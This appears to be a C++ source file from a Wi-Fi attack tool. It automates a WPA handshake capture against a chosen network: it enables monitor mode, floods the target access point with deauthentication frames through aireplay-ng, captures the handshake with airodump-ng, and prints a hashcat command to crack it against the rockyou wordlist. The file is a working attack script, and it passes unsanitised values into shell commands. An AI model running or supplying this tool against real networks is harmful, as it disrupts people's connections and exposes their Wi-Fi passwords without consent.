#include "attacker.hpp"
#include "utils.hpp"
#include "interface.hpp"
#include <iostream>
#include <thread>
#include <chrono>
#include <atomic>
#include <algorithm>
#include <tins/tins.h>
#include <fstream>
#include <cstdio>
#include <dirent.h>
#include <cstring>

using namespace Tins;

std::atomic<bool> keep_sending_deauth{false};
std::atomic<bool> handshake_captured_flag{false};

void force_restore_network() {
    std::cout << "[*] Force restoring network manager..." << std::endl;
    
    system("sudo pkill -f wpa_supplicant 2>/dev/null");
    system("sudo pkill -f dhcpcd 2>/dev/null");
    
    system("sudo ip link set wlp0s20f3 down 2>/dev/null");
    system("sudo iw dev wlp0s20f3 set type managed 2>/dev/null");
    system("sudo ip link set wlp0s20f3 up 2>/dev/null");
    
    system("sudo systemctl restart NetworkManager 2>/dev/null");
    
    std::this_thread::sleep_for(std::chrono::seconds(3));
    
    std::cout << "[+] Network manager restored" << std::endl;
}

bool is_in_monitor_mode(const std::string& interface) {
    std::string output = execute_command(("iwconfig " + interface + " 2>/dev/null | grep -i 'Mode:Monitor'").c_str());
    return !output.empty();
}

bool is_24ghz_channel(int channel) {
    return channel >= 1 && channel <= 14;
}

bool is_5ghz_channel(int channel) {
    return channel >= 36 && channel <= 165;
}

bool setup_monitor_mode(const std::string& interface, int target_channel) {
    std::cout << "[*] Setting up monitor mode on " << interface << "..." << std::endl;
    
    system("sudo airmon-ng check kill > /dev/null 2>&1");
    std::this_thread::sleep_for(std::chrono::milliseconds(500));
    
    std::string cmd = "sudo airmon-ng start " + interface + " 2>&1";
    execute_command(cmd.c_str());
    
    std::string monitor_iface = interface + "mon";
    std::this_thread::sleep_for(std::chrono::seconds(2));
    
    if (target_channel > 0) {
        cmd = "sudo iw dev " + monitor_iface + " set channel " + std::to_string(target_channel);
        execute_command(cmd.c_str());
        std::cout << "[+] Fixed channel to " << target_channel << " on " << monitor_iface << std::endl;
    }
    
    FILE* f = fopen("monitor_iface.conf", "w");
    if (f) {
        fprintf(f, "%s", monitor_iface.c_str());
        fclose(f);
    }
    
    std::cout << "[+] Monitor mode enabled on " << monitor_iface << std::endl;
    return true;
}

void cleanup_monitor_mode(const std::string& interface) {
    std::cout << "[*] Cleaning up..." << std::endl;
    
    system(("sudo airmon-ng stop " + interface + "mon 2>/dev/null").c_str());
    system("sudo pkill -f airodump-ng 2>/dev/null");
    system("sudo pkill -f aireplay-ng 2>/dev/null");
    system("sudo systemctl restart NetworkManager 2>/dev/null");
    std::this_thread::sleep_for(std::chrono::seconds(3));
    
    std::cout << "[+] Cleanup done" << std::endl;
}

bool capture_handshake_with_airodump(const std::string& monitor_iface, const std::string& bssid, 
                                      int channel, int timeout_seconds, 
                                      const std::string& output_prefix) {
    std::cout << "[*] Starting airodump-ng on " << monitor_iface << "..." << std::endl;
    std::cout << "[*] Target BSSID: " << bssid << std::endl;
    std::cout << "[*] Fixed channel: " << channel << std::endl;
    
    std::string cmd = "sudo iw dev " + monitor_iface + " set channel " + std::to_string(channel);
    execute_command(cmd.c_str());
    std::this_thread::sleep_for(std::chrono::seconds(1));
    
    system("rm -f hs_capture-*.cap 2>/dev/null");
    system("rm -f handshake_captured.cap 2>/dev/null");
    
    cmd = "sudo airodump-ng " + monitor_iface + 
          " --bssid " + bssid + 
          " --channel " + std::to_string(channel) +
          " -w " + output_prefix + 
          " > /tmp/airodump_output.txt 2>&1 &";
    system(cmd.c_str());
    
    std::this_thread::sleep_for(std::chrono::seconds(3));
    
    auto start = std::chrono::steady_clock::now();
    while (!handshake_captured_flag) {
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
            std::chrono::steady_clock::now() - start).count();
        
        if (elapsed >= timeout_seconds) {
            std::cout << "[*] Timeout reached (" << timeout_seconds << " seconds)" << std::endl;
            break;
        }
        
        int result = system("grep -q 'WPA handshake' /tmp/airodump_output.txt 2>/dev/null");
        if (result == 0) {
            std::cout << "\n[+] Handshake captured!" << std::endl;
            handshake_captured_flag = true;
            break;
        }
        
        if (elapsed % 10 == 0 && elapsed > 0) {
            std::cout << "[*] Still waiting for handshake... (" << elapsed << "s)" << std::endl;
        }
        
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    
    system("sudo pkill -f airodump-ng 2>/dev/null");
    std::this_thread::sleep_for(std::chrono::milliseconds(500));
    
    if (handshake_captured_flag) {
        std::string find_cap = "ls " + output_prefix + "-*.cap 2>/dev/null | head -1";
        std::string cap_file = execute_command(find_cap.c_str());
        if (!cap_file.empty()) {
            cap_file.erase(cap_file.find_last_not_of(" \n\r\t") + 1);
            std::string final_name = "handshake_" + std::to_string(time(nullptr)) + ".cap";
            system(("cp " + cap_file + " " + final_name + " 2>/dev/null").c_str());
            std::cout << "[+] Handshake saved to " << final_name << std::endl;
        }
    }
    
    return handshake_captured_flag;
}

bool attack_network(const WiFiNetwork& target) {
    std::string interface = "wlp0s20f3";
    FILE* f = fopen("interface.conf", "r");
    if (f) {
        char line[256];
        if (fgets(line, sizeof(line), f)) {
            std::string s(line);
            if (s.find("INTERFACE=") == 0) {
                interface = s.substr(10);
                if (!interface.empty() && interface.back() == '\n') {
                    interface.pop_back();
                }
            }
        }
        fclose(f);
    }
    
    std::cout << "[*] Using interface: " << interface << std::endl;
    
    if (!setup_monitor_mode(interface, target.channel)) {
        return false;
    }
    
    std::string monitor_iface = interface + "mon";
    f = fopen("monitor_iface.conf", "r");
    if (f) {
        char line[256];
        if (fgets(line, sizeof(line), f)) {
            monitor_iface = line;
            if (!monitor_iface.empty() && monitor_iface.back() == '\n') {
                monitor_iface.pop_back();
            }
        }
        fclose(f);
    }
    
    std::cout << "[*] Using monitor interface: " << monitor_iface << std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(2));
    
    std::cout << "\n[*] Target: " << target.ssid << " (" << target.bssid << ")" << std::endl;
    std::cout << "[*] Channel: " << target.channel;
    if (is_24ghz_channel(target.channel)) {
        std::cout << " (2.4 GHz)";
    } else if (is_5ghz_channel(target.channel)) {
        std::cout << " (5 GHz)";
    }
    std::cout << std::endl;
    
    keep_sending_deauth = true;
    handshake_captured_flag = false;
    
    std::thread deauth_thread([&]() {
        std::cout << "[*] Deauth thread started - sending deauth every 3 seconds" << std::endl;
        
        while (keep_sending_deauth && !handshake_captured_flag) {
            std::cout << "[DEAUTH] Sending deauth to " << target.bssid << "..." << std::endl;
            
            std::string cmd = "sudo aireplay-ng -0 3 -a " + target.bssid + 
                              " --ignore-negative-one " + monitor_iface + " 2>&1 | grep -v 'Waiting'";
            system(cmd.c_str());
            
            for (int i = 0; i < 3 && !handshake_captured_flag && keep_sending_deauth; ++i) {
                std::this_thread::sleep_for(std::chrono::seconds(1));
            }
        }
        
        std::cout << "[*] Deauth thread stopped" << std::endl;
    });
    
    std::string output_prefix = "hs_capture";
    bool success = capture_handshake_with_airodump(monitor_iface, target.bssid, 
                                                    target.channel, 90, output_prefix);
    
    keep_sending_deauth = false;
    
    if (deauth_thread.joinable()) {
        deauth_thread.join();
    }
    
    cleanup_monitor_mode(interface);
    
    if (success) {
        std::cout << "\n[+] SUCCESS! Handshake captured!" << std::endl;
        std::cout << "[*] Next step: hashcat -m 2500 handshake_*.cap /usr/share/wordlists/rockyou.txt" << std::endl;
    } else {
        std::cout << "\n[-] FAILED: Could not capture handshake." << std::endl;
        std::cout << "[*] Make sure a client is connected to the network" << std::endl;
    }
    
    return success;
}
